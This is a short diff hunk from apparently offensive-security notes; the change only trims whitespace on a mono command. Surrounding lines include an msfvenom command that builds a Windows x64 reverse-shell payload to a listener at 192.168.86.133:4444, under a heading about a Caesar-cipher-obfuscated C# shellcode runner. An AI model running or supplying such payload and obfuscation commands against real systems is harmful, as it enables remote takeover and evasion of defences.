@@ -282,7 +282,7 @@ http://heapoverflow.com/f0rums/project.php?issueid=34&filter=changes&page=2
 sudo apt update  
 sudo apt install mono-complete  
 mcs hello.cs  
-mono hello.exe  
+mono hello.exe
 #### C# Shellcode runner by Caesar Cipher shift by 2
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.86.133 LPORT=4444 -f powershell  
 encode_cs2.cs
